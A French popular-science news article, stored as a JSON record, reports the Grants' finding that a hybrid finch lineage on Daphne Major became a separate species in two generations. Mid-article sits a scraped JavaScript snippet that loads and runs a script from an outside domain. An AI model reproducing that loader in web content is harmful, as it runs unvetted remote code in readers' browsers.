{"title": "Galápagos : une nouvelle espèce apparaît en seulement deux générations", "newspaper": "Futura Sciences", "author": "Marie-Céline Ray", "date_publi": "27/11/2017", "content": "Il y a trente-six ans, un pinson mâle est venu sur une île isolée de l'archipel des Galápagos. Ce nouvel arrivant s'est reproduit avec un oiseau d'une autre espèce qui vivait sur l'île. Le couple est à l'origine d'une nouvelle espèce qui compterait aujourd'hui une trentaine d'individus. Les  pinsons de Darwin  sont des oiseaux qui vivent sur les îles Galápagos, dans l' océan Pacifique . Ce site isolé est idéal pour étudier l'évolution de la  biodiversité , comme l'a fait  Charles Darwin  en son temps. Sa  théorie de l'évolution  se base notamment sur l'étude des  becs  de différentes espèces de pinsons.  Dans un article paru dans  Science , les pinsons de  Darwin  sont à nouveau les vedettes de travaux qui apportent des informations importantes sur l' émergence  de nouvelles espèces. Des chercheurs des universités de Princeton (États-Unis) et d'Uppsala (Suède) montrent ainsi comment une nouvelle  espèce  peut se développer en seulement deux générations, soit beaucoup moins que ce que l'on pensait jusqu'à présent.  Le saviez-vous ? Il existe une quinzaine d’espèces de pinsons de Darwin provenant toutes d’une espèce ancestrale qui aurait colonisé les Galápagos il y a un à deux millions d’années. Les pinsons se sont diversifiés en plusieurs espèces ; des changements dans la taille et la forme du bec leur ont permis d’utiliser différentes sources de nourriture. L'histoire de cette nouvelle espèce a commencé il y a près de quarante ans, avec les travaux d'un couple de biologistes, Peter et Rosemary Grant, sur la petite île de Daphne Mayor. En 1981, un étudiant a remarqué un nouveau venu sur l'île : un  oiseau  mâle qui avait un  chant  inhabituel ; son corps et son bec étaient plus gros que ceux des trois autres espèces présentes sur l'île. Dans un  communiqué , Peter Grant a expliqué :  « Nous ne l'avons pas vu voler au-dessus de la mer, mais nous l'avons remarqué peu de temps après son arrivée. Il était si différent des autres oiseaux que nous savions qu'il ne provenait pas d'un œuf de Daphne Mayor ». Les chercheurs ont prélevé un échantillon de sang de l'oiseau et l'ont relâché. Celui-ci s'est ensuite reproduit avec un pinson de l'espèce  Geospiza fortis , donnant naissance à une nouvelle lignée. L'équipe a suivi sur six générations la descendance de ce gros oiseau ,  en effectuant des prélèvements d'échantillons sanguins. Deux espèces parentales distinctes ont donné naissance à une nouvelle lignée, baptisée  Big Bird  par les chercheurs. Cette photo montre un membre de cette lignée. © P. et R. Grant                               Une spéciation rapide des pinsons de Darwin facilitée par l’isolement  Les chercheurs ont analysé l' ADN  des parents et de leur descendance. Ils ont trouvé que le mâle d'origine était un pinson de l'espèce  Geospiza conirostris  ; il devait provenir de l'île Española, qui se trouve à une distance de plus de 100 km au sud-est de Daphne Mayor. Cela signifie que le mâle ne pouvait pas revenir sur son île pour se reproduire avec une femelle de son espèce. Il a pu se reproduire avec un oiseau présent sur l'île Daphne Mayor.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ensuite, la portée s'est reproduite de manière endogame. En effet, le chant des oiseaux issus de la portée était inhabituel sur l'île et n'attirait pas les femelles des autres espèces. La portée différait aussi des espèces locales par la forme et la taille de son bec. Les membres de la même descendance se sont reproduits entre eux. “ Charles Darwin aurait été ravi de lire cet article. En général, on considère plutôt qu'il faut de nombreuses générations pour former une  nouvelle espèce  ; mais ici, deux générations semblent avoir suffi. Ces travaux suggèrent donc que, au cours de l'évolution des pinsons de Darwin, de nouvelles lignées ont dû apparaître et disparaître à plusieurs reprises. Pour Leif Andersson, professeur à l'université d'Uppsala, un naturaliste qui viendrait à Daphne Mayor sans savoir que cette lignée est apparue très récemment pourrait considérer que c'est l'une des quatre espèces de l' île  ; il conclut :  «  Charles Darwin  aurait été ravi de lire cet article ». Ce qu'il faut retenir Un pinson mâle est arrivé sur l'île Daphne Mayor, en 1981, alors qu'il venait d'une île située à plus de 100 km. Il s'est reproduit avec un membre d'une autre espèce de pinsons. Leurs descendants se sont reproduits entre eux ; leur chant ne séduisait pas les autres pinsons. Cela vous intéressera aussi Pourrait-on prévoir l’évolution d’un organisme vivant ?                       Si dans certaines conditions et pour certains organismes de courte génération comme les bactéries, il est possible de prévoir l’apparition d’un phénomène, ce n’est pas possible chez des organismes comme les mammifères. Notamment parce que les variations apparaissent au hasard.                                       ", "theme": "planete"}